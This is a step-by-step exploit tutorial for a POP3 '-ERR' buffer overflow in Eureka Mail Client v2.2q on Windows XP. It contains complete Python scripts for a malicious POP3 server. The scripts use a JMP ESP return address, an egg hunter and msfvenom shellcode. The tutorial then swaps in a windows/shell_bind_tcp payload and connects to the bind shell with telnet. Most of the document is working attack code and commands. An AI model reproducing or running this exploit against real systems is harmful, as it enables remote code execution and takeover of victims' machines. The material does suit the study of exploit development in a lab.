Exploit for:
Eureka Mail Client v2.2q

Description:
This vulnerability gets triggered when a client connects to a POP3 server.  If the POP3 server sends long/specifically crafted  “-ERR” data back to the client, the client crashes and arbitrary code can be executed.

Discovered by:
Francis Provencher

Written by:
Jean Gonzalez
https://github.com/Jean13

Works in: Windows XP SP2, Windows XP SP3.

Cheers to corelanc0d3r!

09/01/2016

Exploit Steps:

1) Download and install Eureka Mail Client v2.2q or ealier on your Windows XP box.

2) Download and install Immunity Debugger on the same machine.

3) In Immunity Debugger: !mona pattern_create 2000

4) Copy the ASCII pattern from C:\logs\_no_name\pattern.txt 

5) On your Linux machine:
cat > EurekaMail_Exploit_step1.py
#!/usr/bin/python
import socket

# Our pattern
junk = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co"

buffer = junk

try:
	# Setting up a listener on port 110
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.bind(('', 110))
	s.listen(1)
	print("[*] Listening on TCP port 110 [POP3]...")
	print("[*] Have someone connect to this host!\n")
	
	connect, addr = s.accept()

	print("[*] Received connection from: ", addr)
	print("[*] Sending payload...\n")

	# Using a while loop since Eureka survives our first wave of attacks
	while 1:
		connect.send("-ERR " + buffer + "\r\n")
	connect.close()

except:
	print("[*] Connection closed.\n")

6) In your Linux machine:
python EurekaMail_Exploit_step1.py

7) Start Eureka Mail -> Options -> Connection Settings -> Fill in the IP address of your host machine and whatever username and password you want.

8) Attach to the Eureka Mail process in Immunity Debugger and run.

9) In Eureka Mail -> File -> Send and receive emails.
You should notice Eureka Mail crashes. If you look at the Registers section in the CPU pane of Immunity Debugger, you will see our pattern in ESP and EDI.

10) In Immunity Debugger: !mona suggest
From the output you should notice that the cause of the crash is a direct RET overwrite and that the EIP offset is at 711 bytes.
ESP also points at our shellcode after 714 bytes.
Also note the suggested payload; the max payload size being 242 bytes in my case.
We can jump to ESP.

11) In Immunity Debugger: !mona jmp -r esp -m user32
The output in my case is: 0x7E455AF7

We will be using the egg hunting technique for this exploit. Egg hunting is perfect for when the available buffer size is too small for the entire shellcode. What egg hunting does is something called "staged shellcode", where we use a small amount of custom shellcode to find the actual shellcode somewhere else in memory. For the egg hunting technique to work, we must:
1) Be able to jump to and execute some shellcode.
2) Have the real shellcode somewhere in memory.
3) Prepend the real shellcode with a unique tag
The initial/small shellcode (the egg hunter) will look for this tag in memory and execute whatever code is placed right after it.
For the tag to work:
1) It must be unique
2) It needs to be defined as 4 bytes inside the egg hunter
3) It needs to be prepended twice (right after each other, equaling 8 bytes)
4) Have the necessary available space, as per the technique you are using, to host the egg hunter code
The SEH technique uses about 60 bytes
The IsBadReadPtr technique requires 37 bytes
The NtDisplayString technique uses 32 bytes.  
The NtAccessCheckAndAuditAlarm uses 32 bytes.
Note: NtDisplayString only works on NT derived versions of Windows. The others should work on Windows 9x as well.

12) In your Linux machine:
msfvenom -p windows/exec CMD=calc.exe -f ruby

13) Copy the output of step #12.

14) In your Linux machine:
cat > EurekaMail_Exploit_step2.py
#!/usr/bin/python
import socket, struct

# Our local server
local_server = "192.168.1.15"
# Calculating offset to EIP
junk = "A" * (723 - len(local_server))
# Packs the address in little-endian.
# JMP ESP from USER32.dll
ret = struct.pack('<I', 0x7E455AF7)
padding = "\x90" * 1000

# Our egg hunter
# "\x77\x30\x30\x74" is our tag: w00t
egg_hunter = "\x66\x81\xCA\xFF\x0F\x42\x52\x6A\x02\x58\xCD\x2E\x3C\x05\x5A\x74\xEF\xB8" + "\x77\x30\x30\x74" + "\x8B\xFA\xAF\x75\xEA\xAF\x75\xE7\xFF\xE7"

# Our payload, windows/exec CMD=calc.exe
shellcode = ("\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50" +
"\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26" +
"\x31\xff\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7" +
"\xe2\xf2\x52\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78" +
"\xe3\x48\x01\xd1\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3" +
"\x3a\x49\x8b\x34\x8b\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01" +
"\xc7\x38\xe0\x75\xf6\x03\x7d\xf8\x3b\x7d\x24\x75\xe4\x58" +
"\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3" +
"\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a" +
"\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb\x8d\x5d\x6a\x01\x8d" +
"\x85\xb2\x00\x00\x00\x50\x68\x31\x8b\x6f\x87\xff\xd5\xbb" +
"\xf0\xb5\xa2\x56\x68\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c" +
"\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53" +
"\xff\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00")


buffer = junk + ret + egg_hunter + padding + "w00tw00t" + shellcode

try:
	# Setting up a listener on port 110
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.bind(('', 110))
	s.listen(1)
	print("[*] Listening on TCP port 110 [POP3]...")
	print("[*] Have someone connect to this host!\n")
	
	connect, addr = s.accept()

	print("[*] Received connection from: ", addr)
	print("[*] Sending payload...\n")

	# Using a while loop since Eureka survives our first wave of attacks
	while 1:
		connect.send("-ERR " + buffer + "\r\n")
	connect.close()

except:
	print("[*] Connection closed.\n")

15) Attach to the Eureka Mail process in Immunity Debugger.

16) In Immunity Debugger: bp 0x7E455AF7

17) Run the Eureka Mail process in Immunity Debugger.

18) In your Linux machine:
python EurekaMail_Exploit_step2.py

19) In Eureka Mail -> File -> Send and receive emails.
You should notice Eureka Mail crashes. If you look at ESP in the Registers section in the CPU pane of Immunity Debugger, you will see our egg hunter at 0x0012CD6C

20) Continue to run the process. 
You should notice that calc.exe pops up. Excellent.

21) In your Linux machine:
msfvenom -p windows/shell_bind_tcp -f ruby --smallest

22) Replace the previous shellcode with the output of step #21.

23) In your Linux machine:
python EurekaMail_Exploit_step3.py

24) Start Eureka Mail -> File -> Send and receive emails.

25) In your Linux machine:
telnet 192.168.1.22 4444

